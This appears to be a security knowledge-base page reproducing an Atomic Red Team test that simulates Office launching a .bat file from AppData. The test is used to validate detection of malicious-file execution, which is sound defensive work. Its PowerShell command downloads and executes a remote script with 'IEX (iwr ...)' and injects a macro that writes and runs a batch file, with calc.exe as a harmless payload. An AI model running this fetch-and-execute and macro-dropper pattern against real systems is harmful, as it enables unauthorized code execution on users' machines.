---
atomic_guid: "9215ea92-1ded-41b7-9cd6-79f9a78397aa"
title: "Office launching .bat file from AppData"
framework: "atomic"
generated: "true"
attack_technique_id: "T1204.002"
attack_technique_name: "User Execution: Malicious File"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "9215ea92-1ded-41b7-9cd6-79f9a78397aa"
  - "Office launching .bat file from AppData"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Office launching .bat file from AppData

Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.

## Metadata

- Atomic GUID: 9215ea92-1ded-41b7-9cd6-79f9a78397aa
- Technique: T1204.002: User Execution: Malicious File
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1204.002/T1204.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1204-user_execution|T1204.002]]

## Input Arguments

### bat_path

- description: Path to malicious .bat file
- type: string
- default: $("$env:temp\art1204.bat")

### ms_product

- description: Maldoc application Word or Excel
- type: string
- default: Word

## Dependencies

Microsoft #{ms_product} must be installed

### Prerequisite Check

```powershell
try {
  New-Object -COMObject "#{ms_product}.Application" | Out-Null
  $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
```

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c #{bat_path} `", vbNormalFocus)`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
```

### Cleanup

```powershell
Remove-Item #{bat_path} -ErrorAction Ignore
Get-Process | Where-Object { $_.MainModule.FileName -like "*calculator*" } | Stop-Process
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml)
